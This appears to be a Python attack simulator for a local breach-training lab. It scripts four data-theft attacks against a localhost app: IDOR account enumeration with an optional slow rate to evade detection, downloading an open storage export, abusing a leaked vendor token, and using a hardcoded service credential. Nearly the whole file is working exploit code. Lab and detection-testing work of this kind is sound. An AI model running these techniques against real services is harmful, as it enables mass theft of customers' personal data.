import requests
import json
import time
import random
import argparse

TARGET_URL = "http://localhost:8000"

def exploit_idor(mode="fast"):
    print(f"[*] Starting IDOR exploit in {mode} mode...")
    # In a real attack, we'd scrape account IDs.
    # For this lab, we assume we've found some IDs or are guessing.

    # Let's assume we found 20 account IDs to target
    target_ids = [f"ACC-{random.randint(10000000, 99999999)}" for _ in range(20)]
    # Note: In a real test, we'd use a known list from seed_data.json

    exfiltrated_data = []

    for acc_id in target_ids:
        try:
            # Simulate a logged in user (User A) trying to access other accounts
            headers = {"x-user-id": "user-a-123"}
            resp = requests.get(f"{TARGET_URL}/api/accounts/{acc_id}", headers=headers)

            if resp.status_code == 200:
                exfiltrated_data.append(resp.json())
                print(f"[+] Exfiltrated: {acc_id}")

            if mode == "slow":
                # Slow and low scraping to evade detection
                time.sleep(random.uniform(2.0, 5.0))
            elif mode == "fast":
                # High rate dump
                time.sleep(0.1)

        except Exception as e:
            print(f"[-] Error: {e}")

    print(f"[*] Finished IDOR. Total records: {len(exfiltrated_data)}")
    return exfiltrated_data

def exploit_storage():
    print("[*] Attempting to access permissive storage bucket...")
    try:
        resp = requests.get(f"{TARGET_URL}/storage/exports/customer_data_full.json")
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] Success! Exfiltrated {len(data['records'])} customer records.")
            return data['records']
    except Exception as e:
        print(f"[-] Error: {e}")
    return []

def exploit_vendor():
    print("[*] Attempting exfiltration via compromised vendor token...")
    try:
        # The "leaked" vendor token
        headers = {"Authorization": "Bearer vendor_secret_token_99"}
        # We'll target a few known customer IDs
        # For simulation, we'll guess or use a small list
        target_customers = ["cust-1", "cust-2", "cust-3"]

        exfiltrated_data = []
        for cust_id in target_customers:
            resp = requests.get(f"{TARGET_URL}/api/vendor/credit-check/{cust_id}", headers=headers)
            if resp.status_code == 200:
                exfiltrated_data.append(resp.json()["full_profile"])
                print(f"[+] Exfiltrated profile for {cust_id}")

        return exfiltrated_data
    except Exception as e:
        print(f"[-] Error: {e}")
    return []

def exploit_creds():
    print("[*] Testing hardcoded service credentials...")
    try:
        # The hardcoded token from main.py
        token = "mb_svc_prod_secret_2024_admin_access"
        resp = requests.post(f"{TARGET_URL}/api/internal/sync-job", params={"token": token})
        if resp.status_code == 200:
            print("[+] Service credential verified! Access granted.")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Breach Lab Attack Simulator")
    parser.add_argument("--attack", choices=["idor", "storage", "vendor", "creds"], required=True)
    parser.add_argument("--mode", choices=["fast", "slow"], default="fast")
    args = parser.parse_args()

    if args.attack == "idor":
        exploit_idor(args.mode)
    elif args.attack == "storage":
        exploit_storage()
    elif args.attack == "vendor":
        exploit_vendor()
    elif args.attack == "creds":
        exploit_creds()
